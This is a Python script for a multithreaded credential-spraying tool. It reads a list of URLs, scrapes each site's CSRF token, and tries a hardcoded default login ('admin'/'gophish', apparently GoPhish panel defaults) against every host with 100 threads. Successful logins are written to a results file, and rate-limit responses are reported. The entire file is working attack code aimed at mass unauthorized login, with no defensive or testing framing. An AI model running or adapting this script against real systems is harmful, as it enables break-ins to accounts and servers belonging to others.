import logging
import urllib3
import urllib.parse
import time
import colorama
import json
import requests

from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style


# some initialization shenanigans
# Configure logging
logging.basicConfig(
    filename='sprayer.log',
    level=logging.DEBUG,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
# Suppress the InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

colorama.init(autoreset=True)


class Sprayer(object):
    def __init__(self):
        self.results_file = open("Results.txt", 'a')
        self.username = None
        self.password = None
        self.urls = []
        self.headers = json.loads(open("headers.json").read())

    def normalize_url(self, url):
        '''
        1) urldecode & strip
        2) ensure no trailing paths at the end of the URL.
        '''
        url = urllib.parse.unquote(url)
        url = f"{url}".strip().rstrip()
        url = url.replace('https://', '').replace('http://', '')

        if '/' in url:
            url = url.split('/')[0]

        url = f"https://{url}"
        return url

    def login(self, url):
        session = requests.Session()
        
        for _ in range(3): # 3 retries
            try:                
                # parse the CSRF token:
                req = session.get(url=f"{url}/login?next=%2F", verify=False, headers=self.headers, timeout=60)

                # input(f"{session.cookies}")

                # open("lmao.html", 'wb').write(req.content)
                CSRF_token = req.text.split('name="csrf_token" value="', 1)[1].split('"')[0].strip().rstrip().replace("&#43;", '+')
                CSRF_token = urllib.parse.quote(CSRF_token)
                # print(f"[ CSRF Token ]: {CSRF_token}")

                # Attempt the login:
                headers = self.headers
                # NOTE: spent like 30 minutes debugging, forgot that forms need to have this content-type or server doesn't understand
                # the data we're sending it
                # headers["content-Type"] = f"application/x-www-form-urlencoded"
                data = (
                    f"username={self.username}&password={self.password}&csrf_token={CSRF_token}"
                )
                req = session.post(url=f"{url}/login", headers=headers, verify=False, data=data, timeout=60)
                if req.status_code == 401: # Login failed
                    print(f"[ Login Failed! ]")
                    pass
                elif req.status_code == 302: # login succeeded
                    valid_line = f"[ ({url})|{self.username}:{self.password} ]"
                    self.results_file.write(f"{valid_line}\n")
                    self.results_file.flush()
                    print(f"{Fore.GREEN}{Style.BRIGHT}{valid_line}")
                elif req.status_code == 429: # rate-limited
                    print(f"[ Rate-Limited ! ]")
                    pass
                else: # unknown
                    open(f"{time.time()}-unknown.html", 'wb').write(req.content)
                    

                break
            except Exception as err:
                # print(f"{Fore.RED}{err}")
                logging.error(f"({url}) ==> {err}")
                pass


    def main(self):
        self.urls = list(set(open("urls.txt").readlines()))
        # self.password = input(f"[ Password to spray with ]: ").strip().rstrip()
        # self.username = input(f"[ Username to spray with : ]").strip().rstrip()
        self.username, self.password = "admin", "gophish"

        print(f"[ Normalizing Urls... ]")
        normalized = []
        for url in self.urls:
            normalized_url = self.normalize_url(url)
            if url != normalized_url:
                print(f"Normalized ({url}) ==> {normalized_url}")
            normalized.append(normalized_url)
        
        self.urls = normalized
        normalized = []
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            executor.map(self.login, self.urls)


if __name__ == "__main__":
    obj = Sprayer()
    obj.main()